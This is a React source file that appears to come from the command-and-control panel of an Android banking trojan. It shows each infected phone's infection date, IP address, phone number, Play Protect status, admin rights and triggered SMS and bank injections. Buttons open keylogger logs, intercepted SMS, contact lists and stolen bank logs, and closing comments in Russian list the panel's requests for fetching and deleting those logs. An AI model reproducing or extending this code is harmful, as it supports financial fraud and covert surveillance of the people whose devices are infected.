import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import EditCommentUniversal from '../EditCommentUniversal';
import { Link } from 'react-router-dom';
import { try_eval } from '../../serviceF';

class BotInfoModal extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            myObjJS: null,
            BotID: SettingsContext.CurrentSetBot
        };
    }

    componentWillReceiveProps() {
        this.onLoadJson();
    }

    onLoadJson () {
        if(SettingsContext.CurrentSetBot.length < 1) {
            return;
        }
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"getBotsFull","idbot":"' + SettingsContext.CurrentSetBot + '"}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					this.setState({
						myObjJS: result,
						BotID: SettingsContext.CurrentSetBot
					});
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading bot info. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    ServicesIcons(_statProtect, _statScreen, _statAccessibility, _statSMS, _statCards, _statBanks, _statMails, _statAdmin, _statDownloadModule) {
        let html = "<center style='line-height: 23px; font-size: 18px;'>";
        
        if(_statScreen == 1) {
            html += "<i class=\"fa-yellow far fa-eye\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"User looks at the screen\"></i>";
        }
        else {
            html += "<i class=\"fa-green far fa-eye-slash\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"User does not look at the screen\"></i>";
        }

        html += ' ';
        if(_statProtect == 0) {
            html += "<i class=\"fa-green far fa-shield\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect disabled\"></i>";
        }
        else if(_statProtect == 2) {
            html += "<i class=\"fa-yellow fas fa-shield-alt\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect status not defined\"></i>";
        }
        else {
            html += "<i class=\"fa-red fas fa-shield-check\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Play Protect enabled\"></i>";
        }

        html += ' ';
        if(_statAccessibility == 1) {
            html += "<i class=\"fa-green fas fa-universal-access\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Accessibility enabled\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow fal fa-universal-access\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Accessibility disabled\"></i>";
        }

        html += ' ';
        if(_statSMS == 1) {
            html += "<i class=\"fa-green fas fa-sms\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"SMS Injection Triggered\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow far fa-sms\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"SMS Injection not Triggered\"></i>";
        }

        html += ' ';
        if(_statBanks == 1) {
            html += "<i class=\"fa-green fas fa-usd-circle\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Banks Injection Triggered\"></i>";
        }
        else {
            html += "<i class=\"fa-yellow fal fa-usd-circle\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Banks Injection not Triggered\"></i>";
        }

        html += ' ';
        if(_statAdmin == 1) {
            html += "<i class=\"fa-green fas fa-route-highway\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"There are admin rights\"></i>";
        }
        else {
            html += "<i class=\"fa-red fas fa-route-highway\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"no admin rights\"></i>";
        }

        html += ' ';
        if(_statDownloadModule == 1) {
            html += "<i class=\"fa-green fab fa-mandalorian\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Main module loaded\"></i>";
        }
        else {
            html += "<i class=\"fa-red fab fa-mandalorian\" data-placement=\"bottom\" data-toggle=\"tooltip\" title=\"Main module not load\"></i>";
        }

        html += '</center>';

        return html;
    }

    CalculateBanks(bankss) {
        try {
            let banksList = '';
            bankss.split(':').forEach(function(element) {
                banksList += element + '<br>';
            });
            if(banksList.substring(0,4) == '<br>') {
                return banksList.substring(4, banksList.length);
            }
            return banksList;
        }
        catch (err) {
            return err.toString();
        }
    }

    ChangeDefaultComment(newComment) {
        this.props.BotListForceUpdate();
    }

    HideThisModal() {
        try_eval('$("#BotInfoModal").modal("hide");');
    }

    componentDidUpdate() {
        try_eval('UpdateToolTips();');
    }

    openLogsModal(logtype) {
        SettingsContext.CurrentLogType = logtype;
        this.props.BotListForceUpdate();
        try_eval('$("#LogsInfoModal").modal("show");' + 
        '$("#LogsInfoModal").css("z-index","1080");' +
        '$("#_backdropLogsInfoModal").css("z-index","1070");' );
    }

    openBankLogsModal(logtype) {
        SettingsContext.CurrentLogType = logtype;
        this.props.BotListForceUpdate();
        try_eval('$("#BanksLogsInfoModal").modal("show");' + 
        '$("#BanksLogsInfoModal").css("z-index","1080");' +
        '$("#_backdropBanksLogsInfoModal").css("z-index","1070");' );
    }

    componentDidMount() {
        try_eval('UpdateToolTips();');
    }

    render() {

        if(!isNullOrUndefined(this.state.myObjJS)) {
            var _id = this.state.myObjJS['id'];
            var _version = this.state.myObjJS['version'];
            var _tag = this.state.myObjJS['tag'];
            var _country = this.state.myObjJS['country'];
            var _banks = this.state.myObjJS['banks'];
            var _dateInfection = this.state.myObjJS['dateInfection'];
            var _ip = this.state.myObjJS['ip'];
            var _operator = this.state.myObjJS['operator'];
            var _model = this.state.myObjJS['model'];
            var _phoneNumber = this.state.myObjJS['phoneNumber'];
            try {
            var _command = new Buffer(this.state.myObjJS['commands'].toString()  == null ? '' : this.state.myObjJS['commands'].toString(), 'base64').toString('utf-8');
            }
            catch(err) {}
            try {
                var _comment = new Buffer(this.state.myObjJS['comment'].toString()  == null ? '' : this.state.myObjJS['comment'].toString(), 'base64').toString('utf-8');
            }
            catch (err) {}
            var _statProtect = this.state.myObjJS['statProtect'];
            var _statScreen = this.state.myObjJS['statScreen'];
            var _statAccessibility = this.state.myObjJS['statAccessibility'];
            var _statSMS = this.state.myObjJS['statSMS'];
            var _statCards = this.state.myObjJS['statCards'];
            var _statBanks = this.state.myObjJS['statBanks'];
            var _statMails = this.state.myObjJS['statMails'];
            var _activeDevice = this.state.myObjJS['activeDevice'];
            var _locale = this.state.myObjJS['locale'];
            var _batteryLevel = parseInt(this.state.myObjJS['batteryLevel']);
            var _timeWorking = this.state.myObjJS['timeWorking'];
            var _statDownloadModule = this.state.myObjJS['statDownloadModule'];
            var _statAdmin = this.state.myObjJS['statAdmin'];
            var _updateSettings = this.state.myObjJS['updateSettings'];
            var statLogs = this.state.myObjJS['statLogs'];
            var statLogsKeylogger = this.state.myObjJS['statLogsKeylogger'];
            var statLogsSmsSaved = this.state.myObjJS['statLogsSmsSaved'];
            var statLogsApp = this.state.myObjJS['statLogsApp'];
            var statLogsNumber = this.state.myObjJS['statLogsNumber'];
            /*
            statLogs	1
            statLogsSms	1
            statLogsApp	1
            statLogsNumber	1
            statLogsKeylogger	1
            */
        }

        var batteryLevelClass = 'fas fa-battery-full';
        if(_batteryLevel <= 100 && _batteryLevel > 95) {
            batteryLevelClass = 'fas fa-battery-full';
        }
        else if(_batteryLevel <= 95 && _batteryLevel > 70) {
            batteryLevelClass = 'fas fa-battery-three-quarters';
        }
        else if(_batteryLevel <= 70 && _batteryLevel > 40) {
            batteryLevelClass = 'fas fa-battery-half';
        }
        else if(_batteryLevel <= 40 && _batteryLevel > 10) {
            batteryLevelClass = 'fas fa-battery-quarter';
        }
        else {
            batteryLevelClass = 'fas fa-battery-empty';
        }

        return (
          //<!-- Modal -->
            <div class="modal fade" id="BotInfoModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered" role="document">
                    <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLongTitle"><b>{'Info Bot - '}</b><i>{SettingsContext.CurrentSetBot}</i></h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div style={({marginBottom: '15px'})}>
                    <table class="table table-striped table-dark table-hover ">
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="fab fa-android"></i></td>
                        <td>{_version}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="fal fa-globe-europe"></i></td>
                        <td>Country: <img src={"/img/flag/" + _country + ".png"} />({_country})&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Locale: ({_locale})</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="far fa-tags"></i></td>
                        <td>{_tag}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="far fa-landmark"></i></td>
                        <td dangerouslySetInnerHTML={{__html:_banks == '' ? 'No have banks' : this.CalculateBanks(_banks)}}/>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="far fa-clock"></i></td>
                        <td>{_dateInfection}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="far fa-chart-network"></i></td>
                        <td>{_ip}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="far fa-mobile-alt"></i></td>
                        <td>{_operator}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="fal fa-mobile-android"></i></td>
                        <td>{_model}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class={batteryLevelClass}></i></td>
                        <td>{_batteryLevel}%</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="fal fa-mobile-android-alt"></i></td>
                        <td>{_phoneNumber == '' ? "Phone number NaN" : _phoneNumber}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="far fa-comment"></i></td>
                        <td class="fullIconSizeTB" >
                            <div style={({marginLeft: '10px',marginTop: '4px'})}><EditCommentUniversal parentObj={this} idbot={_id} text={_comment} request="editComment" /></div>
                        </td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="fab fa-galactic-republic"></i></td>
                        <td>{'Device Activity ' + (_activeDevice == '' ? '0' : _activeDevice) + ' times'}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="fal fa-clock"></i></td>
                        <td>{'Life time after install ' + _timeWorking + 's'}</td>
                        </tr>
                        <tr>
                        <td class="fullIconSizeTB" scope="row"><i class="far fa-terminal"></i></td>
                        <td style={({padding: '0px'})}>
                            <div class="">
                                <textarea readonly="readonly" value={_command} class="form-control" rows="1"></textarea>
                            </div>
                        </td>
                        </tr>
                        <tr>
                        <td colSpan={2} class="fullIconSizeTB" dangerouslySetInnerHTML={{__html:this.ServicesIcons(_statProtect, _statScreen, _statAccessibility, _statSMS, _statCards, _statBanks, _statMails, _statAdmin, _statDownloadModule)}}/>
                        </tr>
                    </table>
                    <table class="buttonwidthtable">
                        <tbody>
                            <tr>
                                <td>
                                    <a class={"btn " + (statLogs == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openLogsModal('getLogsSMS')}>SMS, USSD, Events</a>
                                </td>
                                <td>
                                    <a class={"btn " + (statLogsKeylogger == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openLogsModal('getLogsKeylogger')}>Keylogger</a>
                                </td>
                                <td>
                                    <a class={"btn " + (statLogsSmsSaved == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openLogsModal('getLogsBotsSmsSaved')}>Saved SMS</a>
                                </td>
                                
                            </tr>
                        </tbody>
                    </table>
                    <table class="buttonwidthtable" style={({marginTop:'5px'})}>
                        <tbody>
                            <tr>
                                <td>
                                    <a class={"btn " + (statLogsApp == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openLogsModal('getlogsListApplications')}>Installed Apps</a>
                                </td>
                                <td>
                                    <a class={"btn " + (statLogsNumber == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openLogsModal('getlogsPhoneNumber')}>Contact list</a>
                                </td>
                                <td>
                                    <a class={"btn " + (_statBanks == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openBankLogsModal('Bank')}>LOGS</a>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    </div>
                    </div>
                </div>
            </div>
      );
    }
}
/*
// {"request":"getLogsSMS","idbot":""}    <-- тут все логи бота(перехват СМС и т д)!
      
// {"request":"deleteLogsSMS","idbot":""}   <-- делете все логи бота!
        
// {"request":"getLogsKeylogger","idbot":""} <-- тут все логи кейлоггера!
        
// {"request":"deleteLogsKeylogger","idbot":""}  <-- делете все логи кейлоггера!
        
// {"request":"getLogsBots","idbot":""}  <-- тут все логи сохраненных смс!

// {"request":"deleteLogsBots","idbot":""}  <-- делете все логи сохраненных смс!
         
// {"request":"getlogsListApplications","idbot":""}   <-- список установленных прил!
        
// {"request":"dellogsListApplications","idbot":""}  <-- делете список установленных прил!
        
// {"request":"getlogsPhoneNumber","idbot":""}  <--  список номеров!
        
// {"request":"deletelogsPhoneNumber","idbot":""}<-- делете список номеров!

*/
export default BotInfoModal;